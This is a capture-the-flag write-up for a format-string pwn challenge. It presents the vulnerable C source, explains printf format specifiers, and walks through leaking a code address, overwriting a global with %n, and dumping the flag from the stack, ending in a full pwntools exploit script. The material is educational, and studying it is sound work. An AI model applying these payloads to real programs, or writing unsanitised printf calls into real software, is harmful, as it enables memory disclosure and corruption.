# Leaky Pipes

 Hard  Pwn

[Open Challenge](https://app.traboda.com/challenge/1071) 

**Author**: [d1g174l_f0r7r355](https://twitter.com/BhaskaraShravya)

This was one of the hard challenges I made for inctfj qualifiers. It is based on format strings. I will try to explain all the concepts required and used in this challenge.

#### Preliminary checks:

It is a 64 bit, dynamically linked, non-stripped binary.

```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
gdb-peda$ 
```

For this challenge all protections are enabled and so the chances of any possible overflow or injecting shellcode is ruled out and we will have to find some other way to pwn it. The source code for the challenge was also given along with the challenge. To understand what the program is actually doing, let's first analyze the source in detail.

#### Source Code analysis:

```c=
#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<time.h>
#include<unistd.h>

int bal = 100;
void use_tape(){
char experience[50];
char flag[50];

FILE *fp;
fp = fopen("flag.txt", "rb");
if(fp != NULL){
fgets(flag, 50, fp);
fclose(fp);

printf("Please give us your feedback!\n");
fgets(experience, 50, stdin);
printf(experience);
exit(0);
}else{
printf("Error opening file!\n");
exit(1);
}

}

void check_leaks(){
char leak[100];

printf("You currently have %d dollars with you!\n", bal);

printf("Where would you like to check your leaks? \n");
fgets(leak, 100, stdin);
printf(leak);

}

void call_plumber(){
printf("Why must you call the plumber when you can fix the leak yourself?\n");
}

void buy_repair_kit(){
if(bal == 200){
use_tape();
}else{
printf("You do not have enough balance! :(\n");
}
}

void initialize()
{
  setvbuf(stdin,0,2,0);
  setvbuf(stdout,0,2,0);
  setvbuf(stderr,0,2,0);
  alarm(30);
}

int main(){
char choice; int bal;

initialize();

printf("Welcome to my home!\nI have recently bought a new house, however, there seems to be a small leakage problem with the pipes.\nI was hoping you could help me fix it.\n");
while(1){
printf("\n1. Check for leaks\n2. Call plumber\n3. Buy repair kit\n\nChoice: ");

scanf("%c", &choice);
getchar();
fflush(stdin);

switch(choice){
  case '1':
    check_leaks();
    break;
  case '2':
    call_plumber();
    break;
  case '3':
    buy_repair_kit();
    break;
  default:
    printf("Invalid choice: \n");
    break;
}
}
return 0;

}
```

Firstly, let us look into what main() is doing!

- The main() function takes a character input `choice`. Depending on our input the functions `check_leaks()`, `call_plumber` and `buy_repair_kit()` are called respecitively. Another thing to note is, it runs in an infinite while loop; meaning we can call each of these functions as many times as possible.

Now let's analyze what happens when each of the functions are called as we give our input choice.

##### check_leaks():

Input choice `1` in the main() function, calls for check_leaks(). What happens here and are there any vulnerabilities in this function? If so how can we exploit it? To answer the above questions, let's look at the `check_leaks()` function in the given source code. As we can see, from the above source code, cheak_leaks() prints out the balance in your account and asks you where you would like to check your leaks. Thereafter, fgets reads 100 bytes of user input into `leak` and simply prints out your leaks using `printf(leak)`. Now why is this a vulnerability? To understand that, let's dive into the concept of **format strings**!

###### Format Strings :

**What are format strings?**

If we look at the manual page of `printf()` function in C, a format strings is defined as:

"The format string is a character string, beginning and ending in its initial shift state, if any. The format string is composed of zero or more directives: ordinary characters (not %), which are copied unchanged to the output stream; and conversion specifications, each of which results in fetching zero or more subsequent arguments. Each conversion specification is introduced by the character %, and ends with a conversion specifier."

**So what does it mean?**

Let's consider an example!

A more familiar widely used syntax while calling printf() looks something like this:

```c=
char my_string[15] = "hello_world!"; 
printf("%s", my_string);
```

As we can see, the first parameter to printf() is a "%s" character implying that a character string should be printed out to screen as output. The second parameter is the the location or simply the variable where the string `hello_world!` is stored in memory.

Here, "%s" is called as the format specifier as it determines what kind of conversion should be done on the subsequent arguments to produce a suitable output. (In this case, our suitable output is a character string.) What are the other format specifiers?

Some other very commonly used format specifiers are:

```
printf("%c", my_char);    --> to print a single character to the screen
printf("%d", my_number);  --> to print a number to the screen
printf("%f", my_number);  --> to print a float to the screen
printf("%x", my_number);  --> %x indicates that the int value should be displayed in hexadecimal. 
printf("%p", &my_number); --> %p is used for printing the value of a pointer. Therefore the second argument to the printf() is always an address. 
printf("%n", &my_number); --> %n prints nothing, instead stores the number of characters printed to the screen to the variable `my_number`.
```

Similary :

```
"%lu" is used for "unsigned long"
"%i" is used for "unsigned integer"
"%o" is used for "octal" and so forth! 
```

**Vulnerabilities?**

Often in exploitation analysis, we have noticed that not all C-library functions are bug free and despite the protections and compiler warnings, it is always possible to overwrite some memory junk, and cause malicious behavior of the program.

`printf()` too has vulnerabilities, that allow us to overwrite addresses and cause such malicious behavior. One example would be to make use of printf() to overwrite a certain `got_address` with `system()` address.

As we know, printf() follows a default syntax where it accepts at least 2 parameters, (first one being a format specifier and the second being the location or a pointer). However it is seen that, `printf(my_string)` where `my_string` is a character array containing the string "hello_world!", will result in "hello_world!" being printed out to the screen. One may ask, despite the usual behavior, how is this a vulnerability. To understand more, let's consider a case where the argument to printf() is user controlled.

Example:

```c=
char inpBuf[20];             
fgets(inpBuf, 20, stdin);  
printf(inpBuf);                 
```

So what do we understand from the above three lines of code?

We see that, the user inputs data into `inpBuf` and the same character array is passed as an argument to printf() without any format specifiers. Now suppose the user decides to give "%p" or a "%x" as his user buffer in the input stream, what do you think will be printed to the screen? Since the first argument given is a format specifier, the pointer value or the address of whatever is present on the top of the stack will be printed out. In case of a 64-bit system, since if the user decides to give "%p" as his inpBuf, it will print the pointer value in register "rsi" since the second argument will be stored "rsi" after the first argument ("%p") being stored in "rdi". Therefore, a user may decide to leak data from the stack by giving suitable offsets i.e "%4$p" will print the pointer value of the 4th offset on the stack. And this is how printf() is abused.

**We will thus make use of the above vulnerability to obtain leaks from memory and also write to memory in a similar manner. This will be discussed in the exploitation part of this writeup.**

##### call_plumber():

Input choice `2` in the main() function, calls for call_plumber(). This function however may not be of much significance to us as it simply prints "Why must you call the plumber when you can fix the leak yourself?". Moving on!

##### buy_repair_kit():

Input choice `3` in the main() function, calls for `buy_repair_kit()`. This function is quite interesting as firstly it checks if `bal == 200`. If the condition is satisfied it will call `use_tapes`. Else it simply prints "You do not have enough balance! :(". If we look at the **global variable** `bal`, we can see that it is initialized to `100`, whereas `bal == 200` in order to pass the check. Which means we need to find a way to overwrite `bal` variable with `200` so that use_tapes() will be called. We will see more of this in the exploitation section of the writeup. For now let's continue with understanding the source code.

##### use_tapes():

This function is only called by `buy_repair_kit` once the condition is satisfied. However we do find that use_tapes() asks for our experience and prints our experience using `printf(experience)`. Another thing to notice in this function is that the flag is read from `flag.txt` into the variable `flag` however it is not printed out. Luckily for us, we observe just another format string vulnerability here, i.e `printf(experience)`. Since we have understood how printf() can be used to leak data from memory, we will use the same concept here to leak the flag!

#### Exploitation:

Now that we have understood the binary and a few other concepts related to the challenge, our logic for exploitation is pretty simple:

- call the function `check_leaks` to obtain the address leak for the global variable `bal` with the help of the format string vullnerability.
- call the function `check_leaks` again to change the value in the global variable `bal` from 100 to 200.
- call the function `buy_repair_kit()`, pass the check so that the function `use_tapes()` is called.
- Once `use_tapes` is called, make use of the format string vulnerability to simply leak the flag!

Let's begin the exploit by going through each of the above four steps.

##### Leaking the address of the global variable "bal":

This might seem a bit tricky and confusing at first, but once we start to analyse and dig in deeper, it will become more and more clearer. We will be leaking the address of bal from the `check_leaks()` function. Thus let us assume our payload to be something of this sort:

`payload = 'aaaaaaaa %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p'`

With this payload, our output is:

```
aaaaaaaa 0x7fb885c53a03 (nil) 0x7fb885b79142 0x7ffcd0ad0140 (nil) 0x6161616161616161 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x7fb885c5000a 0x7fb885aed546 0x55efa9bb0560 0xe65c75d40c88e400 0x7ffcd0ad01d0 0x55efa9bb0532 0x31007ffcd0ad02c0 0xe65c75d40c88e400 (nil)
```

Upon noticing closely, the value at the 6th offset i.e `0x6161616161616161` is nothing but our input string `aaaaaaaa`. We find many other addresses such libc or code addresses. We are however interested in the the address leaked at the 18th offset i.e `0x55efa9bb0560`. Why this address? Well first off wherever our global variable `bal` is stored in memory, its offset from the `code_base` address won't change! Not just the `code_base`, but from any given code address, the offset always remains constant! The address of the global variable `bal` can be found using the command `i var bal` in gdb (Or one can simply use ida/ ghidra for finding the address). As we can see:

```
gdb-peda$ i var bal
All variables matching regular expression "bal":

File global-locale.c:
39: struct __locale_struct _nl_global_locale;

File malloc.c:
1611: static size_t global_max_fast;

File resolv_conf.c:
80: static struct resolv_conf_global *global;

File rtld.c:
278:  struct rtld_global _rtld_global;
306:  struct rtld_global_ro _rtld_global_ro;

Non-debugging symbols:
0x000055efa9bb2d68  __do_global_dtors_aux_fini_array_entry
0x000055efa9bb3010  bal
gdb-peda$ 
```

The address of the global variable `bal` is `0x000055efa9bb3010`. Since the offset of the global variable remains constant from code_base or any code address for that matter, we can make use of the leak obtained at the 18th offset above, ie `0x55efa9bb0560`, to find the address of `bal`. How? Find the offset of the variable `bal` from the leaked stack address, add the offset to the leaked stack address. You may also see how it's actually calculated!

```
gdb-peda$ p 0x000055efa9bb3010 - 0x55efa9bb0560
$1 = 0x2ab0
gdb-peda$ x/x 0x55efa9bb0560 + 0x2ab0
0x55efa9bb3010 <bal>: 0x00000000000000c8
gdb-peda$ 
```

As we can see, the global variable `bal` is present at an offset of 0x2ab0 above the obtained stack leak address.

And so we have have obtained the address for the variable `bal` i.e `0x55efa9bb0560 + 0x2ab0 = 0x000055efa9bb3010`

### Overwriting the value of `bal` from 100 to 200:

Now that we have obtained the address for the global variable `bal`, our task is to overwrite it with `200`. Since there are no other vulnerabilities in the program, we will have to look for a way to overwrite `bal` using format strings only. Thus we will call the function `call_leaks()` again, this time to write to memory. This can be done in 2 ways:

- Using `fmtstr_payload(offset, {addr : value})` in pwntools.
  - While we make use of the above built in function in pwntools, we must note that the offset we give is equal to 6, as we saw above, our input string was found at offset 6. The address we give here is the address of the global variable bal, and the value to give is 200 since that is what we are going to overwrite it with. Thus our payload is something like: `payload = fmtstr_payload(6, {bal_address : 200})`
- Using `%n` format specifier.
  - This could be a bit tricky as it requires for us to understand the concept. `%n` prints nothing, instead stores the number of characters printed onto the screen to the given variable. So what does this mean? Let's consider an example:

```c=
#include<stdio.h>
int main() {
   int s;
   printf("The value of %ns : ", &s);
   printf("%d", s);
   getchar();
   return 0;
}
```

Output obtained is: `The value of s : 13`. Why? That's because the number of characters printed before `%n` is 13. We shall use a similar concept to write to memory.

While writing to memory, we must keep a few things in mind, the offset, the address and the value to overwrite it with. Our offset being 6, adress being that of the recently obtained global variable bal and the value to overwrite it being 200. Our payload will look something like this:

```python=
pay = '%{}p'.format(200-7)  # print (200 - 7) characters to the screen. 
pay += 'c'*7      # print 7 characters to the screen. 
pay += '%8$n'     # Find the offset where address of bal is written to memory. 
pay += p64(bal)   # Write the address of bal to memory.
```

Here is how it looks like in memory!![memory](https://i.imgur.com/Rkf58fb.png)

Thus we see that the address of bal is present at the 8th offset. Another way to calculate would be: `(0x7ffcd0ad0150 - 0x7ffcd0ad0140)//8 + 6`, where `0x7ffcd0ad0150` is where address of bal is written, `0x7ffcd0ad0140` is where our input string is stored, all on the stack. Once we overwrite we can check the value now stored in `bal` to verify.

```
gdb-peda$ x/x 0x55efa9bb3010
0x55efa9bb3010 <bal>: 0x00000000000000c8
```

##### Obtain the flag:

Now that we have leaked and written to memory, once the check passes, `use_tapes` will be called where our next task is to simply leak the flag. Similar to as shown above we can either use '%s' or a '%p' format specifier to leak the flag string. If we are making use of '%p' to leak, we need to be use of converting from hex to string! To find the offset let's give a string of '%p' and see where the flag could be on the stack! `payload = '%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p'`. Output:

```
0x7fb885c53a03 (nil) 0x7fb885b79142 0x7ffcd0ad0120 (nil) (nil) 0x55efaad082a0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x25 0x7fb885afc013 0x667b6a6674636e69 
```

Thus we can find our input string at the 8th offset or if we look closely, we can find that value leaked at the 16th offset is nothing but our flag! Thus to just leak the flag, our payload can be, `payload = %16$p %17$p %18$p %19$p %20$p %21$p`, while running on the server.

#### Exploit:

```python
from pwn import *

context.arch = 'x86_64'
#p = process('./leaky_pipes')

p = remote('gc1.eng.run', 31584)

#gdb.attach(p)

p.recv()
p.sendline('1')
pay = 'a'*8 + ' %18$p'
p.sendline(pay)

p.recvuntil('aaaaaaaa ')
leak = p.recvline()[:-1]

bal = int(leak, 16) + 0x2ab0
info("bal: %s", hex(bal))

p.sendline('1')

pay = '%{}p'.format(200-7)  # print (200 - 7) characters to the screen. 
pay += 'c'*7      # print 7 characters to the screen. 
pay += '%8$n'     # Find the offset where address of bal is written to memory. 
pay += p64(bal)   # Write the address of bal to memory.
pay += p64(0)
p.sendline(pay)

p.recv()
p.sendline('2')

p.recv()
p.sendline('3')
p.sendline('%16$p %17$p %18$p %19$p %20$p %21$p')

p.recvuntil("Please give us your feedback!\n")
s = p.recvline()[:-1].split(' ')
flag = ''
for i in s:
  flag += p64(int(i, 16))
info("flag: %s"%flag[:-2])
p.interactive()
```
